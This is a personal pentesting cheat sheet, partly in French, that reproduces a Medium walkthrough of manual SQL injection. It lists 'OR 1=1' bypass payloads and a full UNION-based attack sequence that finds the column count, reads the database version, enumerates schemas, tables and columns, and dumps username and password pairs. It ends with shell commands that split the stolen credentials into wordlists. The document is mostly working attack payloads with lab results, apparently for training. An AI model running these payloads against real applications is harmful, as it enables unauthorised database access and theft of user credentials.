# Commande d'attaque usuelle
```
offsec' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //

```
Solution manuelle trouvé sur le net :
https://belcyber.medium.com/manual-vs-automatic-testing-for-sql-injection-cf043c6f0dd1

# 1> Manual Testing UNION BASED ATTACK

## **1. Find numbers of colum ORns in the table**

repeat this input until you get a response from the server

' UNION SELECT 1 #  
' UNION SELECT 1,2 #  
' UNION SELECT 1,2,3 #  
' UNION SELECT 1,2,3,4,... #

![](https://miro.medium.com/v2/resize:fit:499/0*bmQyrcPt-kh3UlgL.png)

' UNION SELECT 1,2,3,4,5,6 #

![](https://miro.medium.com/v2/resize:fit:539/0*ts46bzXbtohCGj7O.png)

## **2. Find DB version:** (@@version)

' union select 1,2,3,4,5,@@version #

![](https://miro.medium.com/v2/resize:fit:530/0*EZU2-RVRCcSVHGr-.png)

## **3. Find DB names** (concat(schema_name))

' union select 1,2,3,4,5,concat(schema_name) FROM information_schema.schemata #

![](https://miro.medium.com/v2/resize:fit:565/0*mitEgb7HVj819Txx.png)

## **4. Find tables names (**concat(TABLE_NAME)**)**

**A/ DB=Staff**

' union SELECT 1,2,3,4,5,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='Staff' #

![](https://miro.medium.com/v2/resize:fit:524/0*jswu5-kTG6Ei5m0g.png)

**B/ DB=users**

' union SELECT 1,2,3,4,5,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='users' #

![](https://miro.medium.com/v2/resize:fit:495/0*_2KWY4V4OV2rw2lm.png)

## **5. Find the columns name of a table: (**information_schema.columns**)**

**A/ TABLE=StaffDetails**

' union SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name = 'StaffDetails' #

![](https://miro.medium.com/v2/resize:fit:495/0*qmR9AQ680ffpDPY6.png)

**B/ TABLE=Users**

' union SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name = 'Users' #

![](https://miro.medium.com/v2/resize:fit:453/0*othna1ccNAbVl4pk.png)

**C/ TABLE=UserDetails**

' union SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name = 'UserDetails' #

![](https://miro.medium.com/v2/resize:fit:444/0*DhFa-ircqgqX9jpo.png)

# Results:

> **Number of columns:** 6
> 
> **DB version:** 10.3.17-MariaDB-0+deb10u1
> 
> **Databases — Tables — Columns:**  
> **_information_schema (default)_****_Staff:  
> _**_— —_ **_StaffDetails:_**_— — — — id  
> — — — — firstname  
> — — — — lastname  
> — — — — position  
> — — — — phone  
> — — — — email  
> — — — — reg_date  
> — —_ **_Users:_**_  
> — — — — UserID  
> — — — — Username  
> — — — — Password  
> _**_users:_**_— —_ **_UserDetails:_**_  
> — — — — id  
> — — — — firstname  
> — — — — lastname  
> — — — — username  
> — — — — password  
> — — — — reg_date_

## **6. Dump Data: (**group_concat(username,” | “,password))

' union select 1,2,3,4,5,group_concat(username," | ",password) From users.UserDetails #

![](https://miro.medium.com/v2/resize:fit:875/0*BvBjlvp9pLZg5yDp.png)

cat creds | tr "," "\n" | cut -d " " -f 1 > user  
cat creds | tr "," "\n" | cut -d " " -f 3 > pass

' union select 1,2,3,4,5,group_concat(username," | ",password) From Staff.Users #

![](https://miro.medium.com/v2/resize:fit:641/0*0Gi_tzvDvLT5CZyg.png)